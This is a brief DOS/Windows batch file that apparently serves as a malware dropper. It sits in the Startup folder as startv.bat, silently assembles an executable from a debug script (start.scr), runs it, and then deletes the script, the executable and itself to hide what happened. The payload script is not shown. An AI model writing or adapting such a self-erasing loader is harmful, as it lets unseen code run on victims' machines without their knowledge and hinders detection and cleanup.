@echo off
cd\
cd windows
debug < start.scr > nul
copy start.com start.exe
del start.com
start
del start.scr
del start.exe
del c:\windows\startm~1\programs\startup\startv.bat
